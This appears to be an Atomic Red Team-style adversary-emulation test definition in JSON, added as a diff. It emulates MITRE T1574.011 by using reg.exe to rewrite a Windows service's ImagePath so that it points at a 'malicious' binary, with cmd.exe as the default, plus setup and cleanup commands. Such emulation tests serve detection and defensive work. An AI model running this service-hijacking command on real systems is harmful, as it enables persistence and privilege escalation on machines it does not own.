@@ -1,0 +1,49 @@
+{
+    "name": "Service ImagePath Change with reg.exe",
+    "description": "Change Service registry ImagePath of a bengin service to a malicious file ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n",
+        "cleanup_command": "sc.exe delete #{weak_service_name}\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1574.011",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Services Registry Permissions Weakness",
+    "source": "ART",
+    "uuid": "f38e9eea-e1d7-4ba6-b716-584791963827",
+    "arguments": {
+        "weak_service_name": {
+            "description": "weak service name",
+            "type": "string",
+            "default": "calcservice"
+        },
+        "weak_service_path": {
+            "description": "weak service path",
+            "type": "string",
+            "default": "%windir%\\system32\\win32calc.exe"
+        },
+        "malicious_service_path": {
+            "description": "malicious service path",
+            "type": "string",
+            "default": "%windir%\\system32\\cmd.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "The service must exist (#{weak_service_name})\n",
+            "prereq_command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "sc.exe create #{weak_service_name} binpath= \"#{weak_service_path}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
